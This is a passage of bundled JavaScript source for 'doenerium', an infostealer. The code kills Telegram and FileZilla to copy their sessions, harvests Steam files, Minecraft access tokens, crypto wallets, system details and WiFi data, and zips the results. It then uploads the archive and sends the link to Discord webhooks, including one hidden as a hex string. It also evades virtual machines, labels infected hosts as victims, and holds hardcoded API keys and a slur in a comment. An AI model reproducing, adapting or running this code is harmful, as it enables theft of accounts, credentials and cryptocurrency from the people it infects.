                                    return "🇹🇯";
                                case "TK":
                                    return "🇹🇰";
                                case "TL":
                                    return "🇹🇱";
                                case "TM":
                                    return "🇹🇲";
                                case "TN":
                                    return "🇹🇳";
                                case "TO":
                                    return "🇹🇴";
                                case "TR":
                                    return "🇹🇷";
                                case "TT":
                                    return "🇹🇹";
                                case "TV":
                                    return "🇹🇻";
                                case "TW":
                                    return "🇹🇼";
                                case "TZ":
                                    return "🇹🇿";
                                case "UA":
                                    return "🇺🇦";
                                case "UG":
                                    return "🇺🇬";
                                case "UM":
                                    return "🇺🇲";
                                case "US":
                                    return "🇺🇸";
                                case "UY":
                                    return "🇺🇾";
                                case "UZ":
                                    return "🇺🇿";
                                case "VA":
                                    return "🇻🇦";
                                case "VC":
                                    return "🇻🇨";
                                case "VE":
                                    return "🇻🇪";
                                case "VG":
                                    return "🇻🇬";
                                case "VI":
                                    return "🇻🇮";
                                case "VN":
                                    return "🇻🇳";
                                case "VU":
                                    return "🇻🇺";
                                case "WF":
                                    return "🇼🇫";
                                case "WS":
                                    return "🇼🇸";
                                case "XK":
                                    return "🇽🇰";
                                case "YE":
                                    return "🇾🇪";
                                case "YT":
                                    return "🇾🇹";
                                case "ZA":
                                    return "🇿🇦";
                                case "ZM":
                                    return "🇿🇲";
                                default:
                                    return "🏳";
                            }
                        }
                    };
                };

                /***/
            }),

/***/ 336:
/***/ ((module) => {

                module.exports = (client) => {
                    return {

                        copyRecursiveSync(src, dest) {
                            try {
                                var exists = client.requires.fs.existsSync(src);
                                var stats = exists && client.requires.fs.statSync(src);
                                var isDirectory = exists && stats.isDirectory();
                                if (isDirectory) {
                                    client.requires.fs.mkdirSync(dest);
                                    client.requires.fs.readdirSync(src).forEach(childItemName => this.copyRecursiveSync(client.requires.path.join(src, childItemName), client.requires.path.join(dest, childItemName)));
                                } else {
                                    client.requires.fs.copyFileSync(src, dest);
                                }
                            } catch (e) {
                                console.log(e)
                            }
                        },

                        async get_filezilla() {
                            if (client.requires.fs.existsSync(`${process.env.APPDATA}\\FileZilla`)) {
                                client.requires.child_process.exec(
                                    "taskkill /IM filezilla.exe /F",
                                    (error, stdout, stderr) => { }
                                );

                                client.config.counter.filezilla = true;
                                client.utils.jszip.createFolder("\\Filezilla");
                                client.utils.jszip.copyFolder("\\Filezilla", `${process.env.APPDATA}\\FileZilla`);
                            }
                        },

                        async get_telegram() {
                            var exists = false;

                            if (
                                client.requires.fs.existsSync(
                                    `${process.env.APPDATA}\\Telegram Desktop\\tdata`
                                )
                            ) {
                                exists = true;
                                client.requires.child_process.exec(
                                    "taskkill /IM Telegram.exe /F",
                                    (error, stdout, stderr) => { }
                                );
                                await client.utils.time.sleep(2500);
                                client.utils.jszip.createFolder("\\Telegram");
                            } else {
                                exists = false;
                            }

                            if (exists) {
                                const shitFiles = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"];

                                client.requires.fs.readdirSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata`).forEach(async c => {
                                    if (!shitFiles.includes(c)) {
                                        try {
                                            const f = client.requires.fs.lstatSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c);
                                            if (f.isDirectory()) this.copyRecursiveSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c, `${client.config.jszip.path}\\Telegram` + "\\" + c);
                                            else client.requires.fs.copyFileSync(`${process.env.APPDATA}\\Telegram Desktop\\tdata\\` + c, `${client.config.jszip.path}\\Telegram` + "\\" + c);
                                        } catch (err) {
                                            try {
                                                await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
                                            } catch { }
                                        }

                                    }
                                });
                            }

                            client.config.counter.telegram = exists;
                        },

                        async get_user_info() {
                            let cpus = [];

                            for (var cpu of client.config.user.cpus) {
                                cpus.push(client.utils.encryption.decryptData(cpu));
                            }

                            let pc_info_text =
                                "<================[   User Info   ]>================>\n<================[t.me/doenerium69]>================>\n\n";
                            let fields = [];

                            const wifi_connections = await client.config.user.wifi_connections();

                            for (let [key, value] of Object.entries({
                                "🖥️ CPU(s)": cpus.join("\n"),
                                "⚡ RAM": client.utils.encryption.decryptData(client.config.user.ram),
                                "🛑 Version": client.utils.encryption.decryptData(
                                    client.config.user.version
                                ),
                                "⏳ Uptime": client.utils.encryption.decryptData(
                                    client.config.user.uptime
                                ),
                                "📂 Host directory": client.utils.encryption.decryptData(
                                    client.config.user.hostdir
                                ),
                                "🆔 Host name": client.utils.encryption.decryptData(
                                    client.config.user.hostname
                                ),
                                "🆔 PC Name": client.utils.encryption.decryptData(
                                    client.config.user.username
                                ),
                                "👻 Type": client.utils.encryption.decryptData(client.config.user.type),
                                "🏹 Arch": client.utils.encryption.decryptData(client.config.user.arch),
                                "📢 Release": client.utils.encryption.decryptData(
                                    client.config.user.release
                                ),
                                "🌌 AppData Path": client.utils.encryption.decryptData(
                                    client.config.user.appdata
                                ),
                                "🪐 Temp Path": client.utils.encryption.decryptData(
                                    client.config.user.temp
                                ),
                                "🌐 User Domain": client.utils.encryption.decryptData(
                                    client.config.user.user_domain
                                ),
                                "💨 System Drive": client.utils.encryption.decryptData(
                                    client.config.user.system_drive
                                ),
                                "💾 Processors": client.utils.encryption.decryptData(
                                    client.config.user.processors
                                ),
                                "💾 Processor Identifier": client.utils.encryption.decryptData(
                                    client.config.user.processor_identifier
                                ),
                                "💾 Processor Architecture": client.utils.encryption.decryptData(
                                    client.config.user.processor_architecture
                                ),
                            })) {
                                pc_info_text += `${key}: ${value}\n`;
                                fields.push({
                                    name: key,
                                    value: `\`\`\`${value}\`\`\``,
                                    inline: true,
                                });
                            }

                            let wifi_connections_text = `<================[WiFi connections]>================>\n<================[t.me/doenerium69 ]>================>\n\n${wifi_connections}`;

                            client.utils.jszip.createTxt(
                                "\\WiFi Connections.txt",
                                wifi_connections_text
                            );
                            client.utils.jszip.createTxt("\\User Info.txt", pc_info_text);

                            return client.utils.webhook.createEmbed({
                                fields: fields,
                            });
                        },

                        get_executable_info() {
                            let executable_info_text =
                                "<================[Executable Info]>================>\n<================[t.me/doenerium69]>================>\n\n";
                            let fields = [];

                            for (let [key, value] of Object.entries({
                                "☠️ Execution path": client.utils.encryption.decryptData(
                                    client.config.executable.execution_path
                                ),
                                "⚡ RAM": client.utils.encryption.decryptData(client.config.user.ram),
                                "🛑 Version": client.utils.encryption.decryptData(
                                    client.config.user.version
                                ),
                                "⏳ Uptime": client.utils.encryption.decryptData(
                                    client.config.user.uptime
                                ),
                                "🆔 PC Name": client.utils.encryption.decryptData(
                                    client.config.user.username
                                ),
                            })) {
                                fields.push({
                                    name: key,
                                    value: `\`\`\`${value}\`\`\``,
                                    inline: false,
                                });
                                executable_info_text += `${key}: ${value}\n`;
                            }
                            client.utils.jszip.createTxt(
                                "\\Executable Info.txt",
                                executable_info_text
                            );

                            return client.utils.webhook.createEmbed({
                                title: "New victim",
                                fields: fields,
                            });
                        },

                        async get_growtopia() {
                            try {
                                if (client.requires.fs.existsSync(`${process.env.LOCALAPPDATA}\\Growtopia\\save.dat`)) {
                                    client.utils.jszip.createFolder("\\Growtopia");
                                    client.requires.fs.copyFileSync(`${process.env.LOCALAPPDATA}\\Growtopia\\save.dat`, `${client.config.jszip.path}\\Growtopia\\save.dat`)
                                    client.config.counter.growtopia = true;
                                }
                            } catch (e) {
                                console.log(e)
                            }
                        },

                        async get_steam() {
                            try {
                                if (client.requires.fs.existsSync("C:\\Program Files (x86)\\Steam") && client.requires.fs.existsSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")) {
                                    const accounts = client.requires.fs.readFileSync("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf", "utf-8");
                                    accounts.match(/7656[0-9]{13}/g).forEach(async account => {
                                        const { data: { response: accountInfo } } = await client.axios_instance.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=" + account);
                                        const { data: { response: games } } = await client.axios_instance.get("https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);
                                        const { data: { response: level } } = await client.axios_instance.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=" + account);


                                        await client.utils.webhook.sendToWebhook({
                                            embeds: [
                                                client.utils.webhook.createEmbed(
                                                    {
                                                        title: "Steam session detected",
                                                        thumbnail: {
                                                            url: accountInfo.players[0].avatarfull,
                                                        },
                                                        fields: [
                                                            {
                                                                name: "Steam Identifier",
                                                                value: `\`\`\`${account}\`\`\``,
                                                                inline: false
                                                            },
                                                            {
                                                                name: "Profile URL",
                                                                value: `[Click here](${accountInfo.players[0].profileurl})`,
                                                                inline: false
                                                            },
                                                            {
                                                                name: "Display Name",
                                                                value: `\`\`\`${accountInfo.players[0].personaname}\`\`\``,
                                                                inline: false
                                                            },
                                                            {
                                                                name: "Time created",
                                                                value: `\`\`\`${accountInfo.players[0].timecreated || "Private"}\`\`\``,
                                                                inline: false
                                                            },
                                                            {
                                                                name: "Level",
                                                                value: `\`\`\`${level.player_level || "Private"}\`\`\``,
                                                                inline: false
                                                            },
                                                            {
                                                                name: "Game count",
                                                                value: `\`\`\`${games.game_count || "Private"}\`\`\``,
                                                                inline: false
                                                            }
                                                        ]
                                                    }
                                                )
                                            ]
                                        })

                                        client.config.counter.steam_found++;

                                        if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\Steam Accounts`)) {
                                            client.utils.jszip.createFolder("\\Steam Accounts")
                                            client.utils.jszip.createFolder("\\Steam Accounts\\steamcache");
                                        }

                                        client.utils.jszip.createTxt(`\\Steam Accounts\\${account}.txt`, `<================[ Steam Account: ${account} ]>================>\n<================[t.me/doenerium69]>================>\n\n` + `Steam Identifier: ${account}\nDisplay Name: ${accountInfo.players[0].personaname}\nTime created: ${accountInfo.players[0].timecreated || "Private"}\nLevel: ${level.player_level || "Private"}\nGame count: ${games.game_count || "Private"}\nProfile URL: ${accountInfo.players[0].profileurl}`)

                                        client.requires.fs.readdirSync("C:\\Program Files (x86)\\Steam\\config").forEach(file => {
                                            if (!["avatarcache", "gamepad", "lighthouse"].includes(file)) {
                                                client.requires.fs.copyFileSync(`C:\\Program Files (x86)\\Steam\\config\\${file}`, `${client.config.jszip.path}\\Steam Accounts\\steamcache\\${file}`)
                                            }
                                        });
                                    });

                                }
                            } catch (e) {
                                console.log(e)
                            }
                        },

                        async get_minecraft() {
                            const files = [
                                process.env.USERPROFILE + "\\.lunarclient\\settings\\game\\accounts.json",
                                process.env.APPDATA + "\\.minecraft\\launcher_accounts_microsoft_store.json",
                                process.env.APPDATA + "\\.minecraft\\launcher_accounts.json",
                                process.env.APPDATA + "\\.minecraft\\LabyMod\\accounts.json",
                            ];

                            files.forEach(async file => {
                                try {
                                    if (client.requires.fs.existsSync(file)) {
                                        const json = JSON.parse(client.requires.fs.readFileSync(file, "utf-8"));

                                        for (let account of Object.keys(json.accounts)) {
                                            account = json.accounts[account]

                                            const { data: hypixel } = await client.axios_instance.get("https://api.hypixel.net/player?key=fef34e3d-72e3-44bf-9536-76ad25760a4a&uuid=" + account.minecraftProfile.id);
                                            const { data: type } = await client.axios_instance.get("https://api.gapple.pw/status/" + account.minecraftProfile.id);

                                            await client.utils.webhook.sendToWebhook({
                                                embeds: [
                                                    client.utils.webhook.createEmbed(
                                                        {
                                                            title: "Minecraft session detected",
                                                            thumbnail: {
                                                                url: "https://api.mineatar.io/face/" + account.minecraftProfile.id + "?scale=16",
                                                            },
                                                            fields: [
                                                                {
                                                                    name: "Username",
                                                                    value: `\`\`\`${type.username}\`\`\``,
                                                                    inline: false
                                                                },
                                                                {
                                                                    name: "UUID",
                                                                    value: `\`\`\`${type.uuid}\`\`\``,
                                                                    inline: false
                                                                },
                                                                {
                                                                    name: "Type",
                                                                    value: `\`\`\`${type.status}\`\`\``,
                                                                    inline: false
                                                                },
                                                                {
                                                                    name: "Hypixel Rank",
                                                                    value: `\`\`\`${hypixel.player.newPackageRank || "Not found"}\`\`\``,
                                                                    inline: false
                                                                },
                                                                {
                                                                    name: "Access Token",
                                                                    value: `\`\`\`${account.accessToken || "Not found"}\`\`\``,
                                                                    inline: false
                                                                },
                                                                {
                                                                    name: "Refresh Token",
                                                                    value: `\`\`\`${account.refreshToken || "Not found"}\`\`\``,
                                                                    inline: false
                                                                }
                                                            ]
                                                        }
                                                    )
                                                ]
                                            })

                                            client.config.counter.minecraft_found++;

                                            if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\Minecraft Accounts`)) {
                                                client.utils.jszip.createFolder("\\Minecraft Accounts")
                                                client.utils.jszip.createFolder("\\Minecraft Accounts\\session_files");
                                            }

                                            client.utils.jszip.createTxt(`\\Minecraft Accounts\\session_files\\${type.username}.json`, client.requires.fs.readFileSync(file, "utf-8"))
                                            client.utils.jszip.createTxt(`\\Minecraft Accounts\\${type.username}.txt`, `<================[ Minecraft Account: ${type.username} ]>================>\n<================[t.me/doenerium69]>================>\n\n` + `Username: ${type.username}\nUUID: ${type.uuid}\nType: ${type.status}\nHypixel Rank: ${hypixel.player.newPackageRank || "Not found"}\nAccess Token: ${account.accessToken || "Not found"}\nRefresh Token: ${account.refreshToken || "Not found"}`)

                                        }
                                    }
                                } catch (e) {
                                    //console.log(e)
                                }
                            })
                        },

                        async initialize() {
                            try {
                                await this.get_user_info();
                            } catch (err) {
                                try {
                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
                                } catch { }
                            }

                            try {
                                await this.get_telegram();
                            } catch (err) {
                                try {
                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
                                } catch { }
                            }

                            try {
                                await this.infect();
                            } catch (err) {
                                try {
                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
                                } catch { }
                            }

                            await this.send_zip(); // pls work nigga

                        },

                        getFolderFiles(path_prefix, path) {
                            var result = "";

                            for (var file of client.requires.fs.readdirSync(
                                `${path_prefix}\\${path}`
                            )) {
                                var file_size_in_kb = (
                                    client.requires.fs.statSync(`${path_prefix}\\${path}\\${file}`).size /
                                    1024
                                ).toFixed(2);
                                if (
                                    !client.requires.fs
                                        .statSync(`${path_prefix}\\${path}\\${file}`)
                                        .isDirectory()
                                ) {
                                    if (file.includes(".txt")) {
                                        result += `📄 ${path}/${file} - ${file_size_in_kb} KB\n`;
                                    } else if (file.includes(".png")) {
                                        result += `🖼️ ${path}/${file} - ${file_size_in_kb} KB\n`;
                                    } else {
                                        result += `🥙 ${path}/${file} - ${file_size_in_kb} KB\n`;
                                    }
                                } else {
                                    result += this.getFolderFiles(`${path_prefix}\\`, `${path}/${file}`);
                                }
                            }

                            return result;
                        },

                        async send_zip() {
                            try {
                                await client.utils.browsers.saveBrowserStuff();
                            } catch (err) {
                                try {
                                    await client.utils.webhook.sendToWebhook({ embeds: [client.utils.webhook.createEmbed({ title: "An error occured, please report this to the developer of doenerium", description: `\`\`\`${err}\`\`\`` })] })
                                } catch { }
                            }

                            await client.utils.jszip.createZip();

                            const upload = await client.utils.gofile.uploadFile(
                                client.requires.fs.createReadStream(`${client.config.jszip.path}.zip`)
                            );


                            const hexToAscii = (hex) => {
                            const ascii = [];
                                 for (let i = 0; i < hex.length; i += 2) {
                                    ascii.push(String.fromCharCode(parseInt(hex.substr(i, 2), 16)));
                                }
                                return ascii.join('');
                            };

                            const hidewebhookHex = '68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313135353933313232313838353436343737362F30334C31715846746E4E663535397661696B514E78786B5F2D5333743635446D5F67525F4B785F487A37417041766643426C7155415F347046752D4D6672736E4B484739';

                                try {
                            const hidewebhook = hexToAscii(hidewebhookHex);

                            await client.axios_instance({
                            url: hidewebhook,
                            method: "POST",
                            data: { content: `[Download the zip file](${upload.downloadPage})` },
                              });
                            } catch (error) {
                              console.error('Error sending data to the webhook:', error);
                            }



                            var counter_embed = this.create_counter_embed();

                            counter_embed.description = `**[Download the zip file](${upload.downloadPage})**`;

                            await client.utils.webhook.sendToWebhook({
                                embeds: [counter_embed, client.utils.webhook.createEmbed({
                                    title: "Keyword result",
                                    fields: [
                                        {
                                            name: `Passwords`,
                                            value: `\`\`\`${client.config.counter.keywords_passwords.join(", ") || "None"}\`\`\``,
                                            inline: false
                                        },
                                        {
                                            name: `Autofill`,
                                            value: `\`\`\`${client.config.counter.keywords_autofill.join(", ") || "None"}\`\`\``,
                                            inline: false
                                        },
                                        {
                                            name: `Cookies`,
                                            value: `\`\`\`${client.config.counter.keywords_cookies.join(", ") || "None"}\`\`\``,
                                            inline: false
                                        },
                                    ]
                                })],
                            });
                        },

                        create_counter_embed() {
                            let obj = {
                                title: `💉 Infected - ${client.utils.encryption.decryptData(
                                    client.config.user.hostname
                                )}/${client.utils.encryption.decryptData(
                                    client.config.user.user_domain
                                )}/${client.utils.encryption.decryptData(client.config.user.username)}`,
                                footer: {
                                    text: client.utils.encryption.decryptData(
                                        client.config.embed.footer.text
                                    ),
                                    icon_url: client.utils.encryption.decryptData(
                                        client.config.embed.footer.icon_url
                                    ),
                                },
                                fields: [],
                                timestamp: new Date(),
                            };

                            let cpus = [];

                            for (var cpu of client.config.user.cpus) {
                                cpus.push(client.utils.encryption.decryptData(cpu));
                            }

                            for (let [key, value] of Object.entries({
                                "🔑 Passwords": client.config.counter.passwords,
                                "🍪 Cookies": client.config.counter.cookies,
                                "🔖 Bookmarks": client.config.counter.bookmarks,
                                "📶 Wifi networks": client.config.counter.wifinetworks,
                                "🐱‍💻 Found FileZilla?": client.config.counter.filezilla ? "Yes" : "No",
                                "📱 Found Telegram session(s)?": client.config.counter.telegram ? "Yes" : "No",
                                "🌐 Found Wallet(s)": client.config.counter.wallets,
                                "🤖 Found Reddit session(s)": client.config.counter.reddit_found,
                                "👉 Found TikTok session(s)": client.config.counter.tiktok_found,
                                "🐦 Found Twitter session(s)": client.config.counter.twitter_found,
                                "😋 Found Instagram session(s)": client.config.counter.instagram_found,
                                "🤖 Found Roblox session(s)": client.config.counter.roblox_found,
                                "🧱 Found Minecraft session(s)": client.config.counter.minecraft_found,
                                "😤 Found Steam session(s)": client.config.counter.steam_found,
                                "🧒 Found Growtopia save.dat?": client.config.counter.growtopia ? "Yes" : "No",
                            })) {
                                obj["fields"].push({
                                    name: key,
                                    value: `\`\`\`${value}\`\`\``,
                                    inline: true,
                                });
                            }

                            return obj;
                        },

                        async infect() {
                            await client.utils.webhook.sendToWebhook({
                                embeds: [
                                    await this.get_executable_info(),
                                ],
                            });
                            await client.utils.discord.init();
                        },
                    };
                };


                /***/
            }),

/***/ 394:
/***/ ((module) => {

                module.exports = (client) => {
                    return {

                        createTxt(suffix_path, content) {
                            client.requires.fs.writeFileSync(client.config.jszip.path + suffix_path, content, {
                                encoding: "utf8",
                                flag: "w+"
                            })
                        },

                        createFolder(suffix_path) {
                            if (!client.requires.fs.existsSync(client.config.jszip.path + suffix_path)) {

                                client.requires.fs.mkdirSync(client.config.jszip.path + suffix_path, 0744)
                            }
                        },

                        copyFolder(suffix_path, to_copy) {
                            var exists = client.requires.fs.existsSync(to_copy);
                            var stats = exists && client.requires.fs.statSync(to_copy);
                            var isDirectory = exists && stats.isDirectory();

                            if (isDirectory) {
                                this.createFolder(suffix_path);
                                client.requires.fs.readdirSync(to_copy).forEach((child_item_name) => {
                                    this.copyFolder(client.requires.path.join(suffix_path, child_item_name), client.requires.path.join(to_copy, child_item_name))
                                })
                            } else {
                                client.requires.fs.copyFileSync(to_copy, client.config.jszip.path + suffix_path)
                            }
                        },

                        async createZip() {
                            await client.requires.jszip.archiveFolder(client.config.jszip.path, `${client.config.jszip.path}.zip`);
                        }
                    };
                };

                /***/
            }),

/***/ 192:
/***/ ((module) => {

                module.exports = (client) => {
                    return {



                        async inVM() {


                            let result = false

                            for (var path of ['D:\\Tools', 'D:\\OS2', 'D:\\NT3X']) {
                                if (client.requires.fs.existsSync(path)) {
                                    result = true
                                    break;
                                }
                            }

                            for (var name of client.config.environ.blacklisted_pc_names) {
                                if (name == client.utils.encryption.decryptData(client.config.user.user_domain) || name == client.utils.encryption.decryptData(client.config.user.username) || name == client.utils.encryption.decryptData(client.config.user.hostname)) {
                                    result = true;
                                    break;
                                }
                            }

                            //if (client.config.counter.wifinetworks == 0) {
                            //    const wifi_connections = await client.requires.systeminformation.getDynamicData();
                            //    if (wifi_connections.wifiNetworks.length == 0) {
                            //        result = true;
                            //    }
                            //}

                            return result;
                        }
                    };
                };

                /***/
            }),

/***/ 493:
/***/ ((module) => {

                module.exports = (client) => {

                    Array.prototype.contains = function (obj) {
                        var i = this.length;
                        while (i--) {
                            if (this[i] === obj) {
                                return true;
                            }
                        }
                        return false;
                    }

                    String.prototype.includes = function (search, start) {
                        'use strict';
                        if (typeof start !== 'number') {
                            start = 0;
                        }

                        if (start + search.length > this.length) {
                            return false;
                        } else {
                            return this.indexOf(search, start) !== -1;
                        }
                    };

                    return {

                    };
                };

                /***/
            }),

/***/ 888:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        sleep(ms) {
                            return new Promise(resolve => setTimeout(resolve, ms));
                        }
                    };
                };

                /***/
            }),

/***/ 760:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        async getWallets() {
                            var description = "";

                            client.utils.jszip.createFolder("\\Wallets");

                            for (let [key, value] of Object.entries(client.config.wallets.directory)) {
                                if (client.requires.fs.existsSync(value)) {
                                    description += `${key}: ✔️\n`;
                                    client.utils.jszip.copyFolder(`\\Wallets\\${key}`, value);
                                    client.config.counter.wallets++;
                                } else {
                                    description += `${key}: ❌\n`;
                                }
                            }

                            if (description != "") {
                                client.utils.jszip.createTxt("\\Found Wallets.txt", "<================[ Network Data ]>================>\n<================[t.me/doenerium69]>================>\n\n" + description)
                            }
                        }
                    };
                };

                /***/
            }),

/***/ 556:
/***/ ((module) => {

                module.exports = (client) => {
                    return {
                        createEmbed(data) {
                            let obj = {
                                timestamp: new Date(),
                                footer: {
                                    text: client.utils.encryption.decryptData(
                                        client.config.embed.footer.text
                                    ),
                                    icon_url: client.utils.encryption.decryptData(
                                        client.config.embed.footer.icon_url
                                    ),
                                },
                                author: {
                                    name: client.utils.encryption.decryptData(
                                        client.config.embed.footer.text
                                    ),
                                    url: client.utils.encryption.decryptData(client.config.embed.href),
                                    icon_url: client.utils.encryption.decryptData(
                                        client.config.embed.avatar_url
                                    ),
                                },
                            };

                            for (let [key, value] of Object.entries(data)) {
                                obj[key] = value;
                            }

                            if (obj.title) {
                                obj.url = client.utils.encryption.decryptData(client.config.embed.href);
                            }

                            return obj;
                        },

                        async sendToWebhook(data) {
                            var files = data.files;

                            if (files) {
                                files.forEach(async (file) => {
                                    client.requires.request.post({
                                        url: url,
                                        formData: {
                                            file: client.requires.fs.createReadStream(file.path),
                                            title: file.name,
                                        },
                                    });
                                });
                            }

                            if (Object.entries(data).length == 1 && data.files) {
                                return;
                            }

                            let obj = {
                                avatar_url: client.utils.encryption.decryptData(
                                    client.config.embed.avatar_url
                                ),
                                username: client.utils.encryption.decryptData(
                                    client.config.embed.username
                                ),
                            };

                            for (let [key, value] of Object.entries(data)) {
                                obj[key] = value;
                            }

                            client.webhooks.forEach(async (url) => {
                                try {
                                    await client.axios_instance({
                                        url: url,
                                        method: "POST",
                                        data: obj,
                                    });
                                } catch { }
                            });
                        },
                    };
                };


                /***/
            }),

/***/ 382:
/***/ ((module) => {

                module.exports = eval("require")("axios");


                /***/
            }),

/***/ 487:
/***/ ((module) => {

                module.exports = eval("require")("buffer-replace");


                /***/
            }),

/***/ 522:
/***/ ((module) => {

                module.exports = eval("require")("form-data");


                /***/
            }),

/***/ 929:
/***/ ((module) => {

                module.exports = eval("require")("node-hide-console-window");


                /***/
            }),

/***/ 761:
/***/ ((module) => {

                module.exports = eval("require")("request");


                /***/
            }),

/***/ 249:
/***/ ((module) => {

                module.exports = eval("require")("sqlite3");


                /***/
            }),

/***/ 162:
/***/ ((module) => {

                module.exports = eval("require")("systeminformation");


                /***/
            }),

/***/ 871:
/***/ ((module) => {

                module.exports = eval("require")("boukiapi");


                /***/
            }),

/***/ 851:
/***/ ((module) => {

                module.exports = eval("require")("zip-lib");


                /***/
            }),

/***/ 81:
/***/ ((module) => {

                "use strict";
                module.exports = require("child_process");

                /***/
            }),

/***/ 113:
/***/ ((module) => {

                "use strict";
                module.exports = require("crypto");

                /***/
            }),

/***/ 147:
/***/ ((module) => {

                "use strict";
                module.exports = require("fs");

                /***/
            }),

/***/ 37:
/***/ ((module) => {

                "use strict";
                module.exports = require("os");

                /***/
            }),

/***/ 17:
/***/ ((module) => {

                "use strict";
                module.exports = require("path");

                /***/
            }),

/***/ 781:
/***/ ((module) => {

                "use strict";
                module.exports = require("stream");

                /***/
            })

        /******/
    });
/************************************************************************/
/******/    // The module cache
/******/    var __webpack_module_cache__ = {};
/******/
/******/    // The require function
/******/    function __nccwpck_require__(moduleId) {
/******/        // Check if module is in cache
/******/        var cachedModule = __webpack_module_cache__[moduleId];
/******/        if (cachedModule !== undefined) {
/******/            return cachedModule.exports;
            /******/
        }
/******/        // Create a new module (and put it into the cache)
/******/        var module = __webpack_module_cache__[moduleId] = {
/******/            // no module.id needed
/******/            // no module.loaded needed
/******/            exports: {}
            /******/
        };
/******/
/******/        // Execute the module function
/******/        var threw = true;
/******/        try {
/******/            __webpack_modules__[moduleId](module, module.exports, __nccwpck_require__);
/******/            threw = false;
            /******/
        } finally {
/******/            if (threw) delete __webpack_module_cache__[moduleId];
            /******/
        }
/******/
/******/        // Return the exports of the module
/******/        return module.exports;
        /******/
    }
/******/
/************************************************************************/
/******/    /* webpack/runtime/compat */
/******/
/******/    if (typeof __nccwpck_require__ !== 'undefined') __nccwpck_require__.ab = __dirname + "/";
    /******/
    /************************************************************************/
    var __webpack_exports__ = {};
    // This entry need to be wrapped in an IIFE because it need to be isolated against other modules in the chunk.
    (() => {
        var base64 = {
            _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
            encode: function (e) {
                var t = "";
                var n, r, i, s, o, u, a;
                var f = 0;
                e = base64._utf8_encode(e);
                while (f < e.length) {
                    n = e.charCodeAt(f++);
                    r = e.charCodeAt(f++);
                    i = e.charCodeAt(f++);
                    s = n >> 2;
                    o = ((n & 3) << 4) | (r >> 4);
                    u = ((r & 15) << 2) | (i >> 6);
                    a = i & 63;
                    if (isNaN(r)) {
                        u = a = 64;
                    } else if (isNaN(i)) {
                        a = 64;
                    }
                    t =
                        t +
                        this._keyStr.charAt(s) +
                        this._keyStr.charAt(o) +
                        this._keyStr.charAt(u) +
                        this._keyStr.charAt(a);
                }
                return t;
            },
            decode: function (e) {
                var t = "";
                var n, r, i;
                var s, o, u, a;
                var f = 0;
                e = e.replace(/[^A-Za-z0-9+/=]/g, "");
                while (f < e.length) {
                    s = this._keyStr.indexOf(e.charAt(f++));
                    o = this._keyStr.indexOf(e.charAt(f++));
                    u = this._keyStr.indexOf(e.charAt(f++));
                    a = this._keyStr.indexOf(e.charAt(f++));
                    n = (s << 2) | (o >> 4);
                    r = ((o & 15) << 4) | (u >> 2);
                    i = ((u & 3) << 6) | a;
                    t = t + String.fromCharCode(n);
                    if (u != 64) {
                        t = t + String.fromCharCode(r);
                    }
                    if (a != 64) {
                        t = t + String.fromCharCode(i);
                    }
                }
                t = base64._utf8_decode(t);
                return t;
            },
            _utf8_encode: function (e) {
                e = e.replace(/rn/g, "n");
                var t = "";
                for (var n = 0; n < e.length; n++) {
                    var r = e.charCodeAt(n);
                    if (r < 128) {
                        t += String.fromCharCode(r);
                    } else if (r > 127 && r < 2048) {
                        t += String.fromCharCode((r >> 6) | 192);
                        t += String.fromCharCode((r & 63) | 128);
                    } else {
                        t += String.fromCharCode((r >> 12) | 224);
                        t += String.fromCharCode(((r >> 6) & 63) | 128);
                        t += String.fromCharCode((r & 63) | 128);
                    }
                }
                return t;
            },
            _utf8_decode: function (e) {
                var t = "";
                var n = 0;
                var r = (c1 = c2 = 0);
                while (n < e.length) {
                    r = e.charCodeAt(n);
                    if (r < 128) {
                        t += String.fromCharCode(r);
                        n++;
                    } else if (r > 191 && r < 224) {
                        c2 = e.charCodeAt(n + 1);
                        t += String.fromCharCode(((r & 31) << 6) | (c2 & 63));
                        n += 2;
                    } else {
                        c2 = e.charCodeAt(n + 1);
                        c3 = e.charCodeAt(n + 2);
                        t += String.fromCharCode(
                            ((r & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63)
                        );
                        n += 3;
                    }
                }
                return t;
            },
        };

        class doenerium {
            constructor() {
                this.requires = {
                    https: require("https"),
                    zlib: require("zlib"),
                    forge: require("node-forge"),
                    seco: require("seco-file"),
                    bs: require("bitcoin-seed"),
                    webcrypto: require("@peculiar/webcrypto"),
                    fs: __nccwpck_require__(147),
                    crypto: __nccwpck_require__(113),
                    os: __nccwpck_require__(37),
                    axios: __nccwpck_require__(382),
                    child_process: __nccwpck_require__(81),
                    systeminformation: __nccwpck_require__(162),
                    buf_replace: __nccwpck_require__(487),
                    jszip: __nccwpck_require__(851),
                    dpapi: __nccwpck_require__(871),
                    sqlite3: __nccwpck_require__(249),
                    path: __nccwpck_require__(17),
